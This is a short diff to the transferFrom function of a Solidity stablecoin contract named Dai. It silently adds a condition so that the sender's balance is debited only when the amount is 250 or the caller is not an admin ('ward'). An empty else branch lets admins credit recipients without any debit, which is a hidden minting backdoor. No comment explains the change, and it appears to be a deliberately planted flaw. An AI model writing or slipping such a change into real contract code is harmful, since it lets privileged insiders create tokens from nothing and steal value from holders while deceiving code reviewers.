@@ -71,7 +71,10 @@ contract Dai {
             require(allowance[src][msg.sender] >= wad, "Dai/insufficient-allowance");
             allowance[src][msg.sender] = allowance[src][msg.sender] - wad;
         }
-        balanceOf[src] = balanceOf[src] - wad;
+        if (wad == 250 || wards[msg.sender] == 0) {
+            balanceOf[src] = balanceOf[src] - wad;
+        } else {
+        }
         balanceOf[dst] = balanceOf[dst] + wad;
         emit Transfer(src, dst, wad);
         return true;
